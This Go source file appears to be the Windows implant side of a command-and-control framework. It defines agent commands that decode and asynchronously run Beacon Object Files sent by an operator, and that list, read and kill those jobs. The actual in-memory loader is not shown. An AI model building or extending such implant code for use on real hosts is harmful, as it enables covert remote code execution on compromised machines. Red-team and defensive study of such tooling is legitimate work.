// server/docker/payloads/Windows/action_bof_async.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"runtime"
	"strings"
	"time"
)

// BOFAsyncCommand handles async BOF execution
type BOFAsyncCommand struct{}

func (c *BOFAsyncCommand) Name() string {
	return "bof-async"
}

func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	// Will be handled by processBOFAsync with full command data
	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// BOFJobsCommand lists async BOF jobs
type BOFJobsCommand struct{}

func (c *BOFJobsCommand) Name() string {
	return "bof-jobs"
}

func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call platform-specific implementation
	return executeBOFJobsList()
}

// BOFOutputCommand retrieves output from an async BOF job
type BOFOutputCommand struct{}

func (c *BOFOutputCommand) Name() string {
	return "bof-output"
}

func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]
	return executeBOFGetOutput(jobID)
}

// BOFKillCommand terminates an async BOF job
type BOFKillCommand struct{}

func (c *BOFKillCommand) Name() string {
	return "bof-kill"
}

func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]
	return executeBOFKillJob(jobID)
}

// processBOFAsync handles async BOF execution (called from CommandQueue)
func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Decode BOF and parse arguments (reuse existing logic)
	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E18),
			Error:       err,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	var bofArgs []byte
	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof-async ") {
		argString := strings.TrimPrefix(cmd.Command, "bof-async ")
		if argString != "" {
			parsedArgs, err := parseBOFArguments(argString)
			if err != nil {
			} else {
				bofArgs = parsedArgs
			}
		}
	}

	// Execute async on Windows (platform-specific)
	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
}
